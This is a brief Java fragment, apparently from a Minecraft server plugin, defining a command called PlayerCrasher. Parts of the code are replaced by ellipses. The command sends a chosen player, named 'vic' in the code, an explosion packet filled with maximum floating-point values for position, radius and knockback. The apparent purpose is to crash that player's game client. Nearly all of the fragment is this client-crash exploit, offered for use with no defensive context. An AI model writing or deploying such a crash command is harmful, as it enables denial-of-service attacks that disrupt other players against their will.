...
public class PlayerCrasher extends CommandBase {
	...
	public void execute(CustomPlayer executor, ArrayHelper args) {
		if(args.isLength(1)) {
			...
			vic.sendPacket(new PacketPlayOutExplosion(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE, Float.MAX_VALUE, Collections.EMPTY_LIST, new Vec3D(Double.MAX_VALUE, Double.MAX_VALUE, Double.MAX_VALUE)));
